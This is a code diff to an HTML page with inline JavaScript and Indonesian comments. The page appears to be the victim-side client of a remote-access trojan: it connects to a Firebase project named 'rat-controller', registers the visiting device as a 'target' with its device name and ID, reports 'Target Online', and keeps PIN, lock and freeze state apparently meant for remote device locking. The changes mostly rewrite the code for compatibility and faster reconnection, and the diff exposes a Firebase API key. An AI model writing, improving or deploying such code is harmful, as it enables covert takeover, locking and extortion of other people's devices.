@@ -195,9 +195,9 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script>
         // ============================================================
-        // 🔥 DATA FIREBASE ANDA - SUDAH FIX
+        // 🔥 KONFIGURASI FIREBASE - SUDAH BENAR
         // ============================================================
-        const firebaseConfig = {
+        var firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
             authDomain: "rat-controller-5b29c.firebaseapp.com",
             databaseURL: "https://rat-controller-5b29c-default-rtdb.asia-southeast1.firebasedatabase.app",
@@ -208,14 +208,14 @@
         };
 
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        var db = firebase.database();
 
-        let deviceId = '';
-        let currentPin = '';
-        let correctPin = '';
-        let isLocked = false;
-        let freezeInterval = null;
-        let freezeRemaining = 0;
+        var deviceId = '';
+        var currentPin = '';
+        var correctPin = '';
+        var isLocked = false;
+        var freezeInterval = null;
+        var freezeRemaining = 0;
 
         function generateDeviceId() {
             return 'dev_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2,6);
@@ -224,12 +224,12 @@
         function getDeviceName() {
             try {
                 if (window.navigator && window.navigator.userAgent) {
-                    const ua = window.navigator.userAgent;
-                    if (ua.includes('Android')) {
-                        const match = ua.match(/Android\s([\d.]+)/);
+                    var ua = window.navigator.userAgent;
+                    if (ua.indexOf('Android') !== -1) {
+                        var match = ua.match(/Android\s([\d.]+)/);
                         return 'Android ' + (match ? match[1] : 'Device');
                     }
-                    if (ua.includes('iPhone') || ua.includes('iPad')) {
+                    if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
                         return 'iOS Device';
                     }
                     return 'Unknown Device';
@@ -240,7 +240,7 @@
 
         function registerTarget() {
             deviceId = generateDeviceId();
-            const deviceName = getDeviceName();
+            var deviceName = getDeviceName();
             
             db.ref('targets/' + deviceId).set({
                 deviceName: deviceName,
@@ -257,8 +257,8 @@
                 document.getElementById('statusBar').textContent = '🟢 Target Online | ID: ' + deviceId.slice(0,8);
                 startListening();
             }).catch(function(err) {
-                document.getElementById('loading').textContent = '❌ Gagal konek: ' + err.message;
-                setTimeout(registerTarget, 5000);
+                document.getElementById('loading').textContent = '❌ Gagal konek: ' + err.message + ' - Coba ulang...';
+                setTimeout(registerTarget, 3000);
             });
         }
 
